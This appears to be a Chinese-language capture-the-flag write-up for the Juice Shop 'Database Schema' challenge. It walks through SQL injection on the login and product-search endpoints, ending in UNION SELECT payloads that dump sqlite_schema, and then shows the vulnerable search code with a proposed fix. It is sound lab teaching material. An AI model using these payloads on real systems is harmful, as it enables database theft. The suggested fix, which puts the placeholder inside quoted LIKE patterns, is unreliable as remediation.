- Database Schema
    - 描述：通过SQL注入窃取整个数据库模式定义。
    - 在已知存在 SQL 注入的登录表单中尝试触发错误
        - 使用单引号 ```'```，请求 
            ```POST /rest/user/login HTTP/1.1```
            ```json
            {
                "email":"'",
                "password":"a"
            }
            ```
        - 响应为
            ```json
            {
                "error": {
                    "message": "SQLITE_ERROR: unrecognized token: \"0cc175b9c0f1b6a831c399e269772661\"",
                    "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)",
                    "name": "SequelizeDatabaseError",
                    "parent": {
                        "errno": 1,
                        "code": "SQLITE_ERROR",
                        "sql": "SELECT * FROM Users WHERE email = ''' AND password = '0cc175b9c0f1b6a831c399e269772661' AND deletedAt IS NULL"
                    },
                    "original": {
                        "errno": 1,
                        "code": "SQLITE_ERROR",
                        "sql": "SELECT * FROM Users WHERE email = ''' AND password = '0cc175b9c0f1b6a831c399e269772661' AND deletedAt IS NULL"
                    },
                    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '0cc175b9c0f1b6a831c399e269772661' AND deletedAt IS NULL",
                    "parameters": {}
                }
            }
            ```
        - 分析错误信息：
            - 数据库为 ```SQLITE```
            - 查询 SQL 语句
                ```sql
                SELECT * FROM Users WHERE email = '邮件名注入点' AND password = '密码哈希' AND deletedAt IS NULL```
        - 触发其他错误信息？
    - 使用挑战 XSS - D3 API-only XSS 发现的商品信息查询接口
        - ```GET /api/Products/x HTTP/1.1``` 无法获得有效信息
        - ```GET /rest/products/search?q=x HTTP/1.1```
            - 输入 ```a'```
            - 返回
                ``````json
                {
                    "error": {
                        "message": "SQLITE_ERROR: near \"'%'\": syntax error",
                        "stack": "Error: SQLITE_ERROR: near \"'%'\": syntax error",
                        "errno": 1,
                        "code": "SQLITE_ERROR",
                        "sql": "SELECT * FROM Products WHERE ((name LIKE '%a'%' OR description LIKE '%a'%') AND deletedAt IS NULL) ORDER BY name"
                    }
                }
                ``````
            - 分析错误信息：
                - 查询 SQL 语句
                    ``````sql
                    SELECT * FROM Products WHERE ((name LIKE '%注入点%' OR description LIKE '%注入点%') AND deletedAt IS NULL) ORDER BY name
                    ``````
            - 设计测试向量
                ```foo%')) or 1=1--```
                得到全部产品信息
                - 或精简为 ```'))--```
                    ```name LIKE '%'``` 即匹配全部
            - 获取数据库信息
                - 使用 ```ORDER BY``` 获取表 ```Products``` 的列数为 9
                    - 在 burp 的攻击器中递增排序数字
                        ```')) ORDER BY 1--```
                    - 在数字10报错，且错误信息很详细
                        ```SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 9```
                - 查看表 ```Products``` 列的值的类型
                    - 使用传统的 ```NULL``` 类型报错，似乎是 URL 路径太长
                        ```')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--```
                    - 尝试缩减
                        ```')) UNION SELECT 1,2,3,4,5,6,7,8,9--```
                        恰好此处可使用字符或数字                      

                    - 从官网文档中找到模式表的信息 https://sqlite.org/schematab.html
                        ```sql
                        CREATE TABLE sqlite_schema(
                            type text,
                            name text,
                            tbl_name text,
                            rootpage integer,
                            sql text
                        );
                        ```
                    - 构建模式表查询，模式表有5列 + 4列填充。在原查询中使用不存在的字符串，使得查询结果仅包含 ```UNION``` 查询
                        ```foo')) UNION SELECT *,1,2,3,4 FROM sqlite_schema--```
                        或 
                        ```foo')) UNION SELECT type,name,tbl_name,rootpage,sql,1,2,3,4 FROM sqlite_schema--```
                    - 成功得到数据库模式表。

- 代码挑战
    ``````typescript
    export function searchProducts () {
	  return (req: Request, res: Response, next: NextFunction) => {
	    let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
	    criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
	    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
	      .then(([products]: any) => {
	        const dataString = JSON.stringify(products)
	        for (let i = 0; i < products.length; i++) {
	          products[i].name = req.__(products[i].name)
	          products[i].description = req.__(products[i].description)
	        }
	        res.json(utils.queryResultToJson(products))
	      }).catch((error: ErrorWithParent) => {
	        next(error.parent)
	      })
	  }
	}
    ``````
    - 漏洞在于将输入拼接到 SQL 字符串
        ``````typescript
        models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
        ``````
    - 修复：使用类似占位符预处理的方法
        ``````typescript
        models.sequelize.query(
            `SELECT * FROM Products WHERE ((name LIKE '%:criteria%' OR description LIKE '%:criteria%') AND deletedAt IS NULL) ORDER BY name`, 
            {
                replacements: {
                    criteria
                }
            }
        )
        ``````